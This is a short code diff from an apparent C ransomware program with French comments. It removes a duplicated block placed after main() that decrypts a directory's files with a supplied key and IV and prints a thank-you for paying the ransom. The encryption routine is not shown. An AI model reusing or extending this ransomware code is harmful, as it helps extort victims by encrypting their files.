@@ -294,21 +294,3 @@ int main (int argc, char * argv[])
 		usage();
 	}
 }
-	
-	if (strcmp(argv[2], "-dec")==0 && argc==5)
-	{
-		hexa_to_bytes(argv[3] , key, sizeKey);	
-		hexa_to_bytes(argv[4] , iv, sizeIv);
-		listdir(argv[1], iv, key, 'd');
-		printf("Merci d'avoir payer la rançon !");
-		
-		memset(key, '\0', sizeKey); //A vérifier si c'est bon
-		memset(iv, '\0', sizeIv); //A vérifier si c'est bon
-	}
-	
-	if(strcmp(argv[1], "--help")==0 & argc==2)
-	{
-		usage();
-	}
-}
-
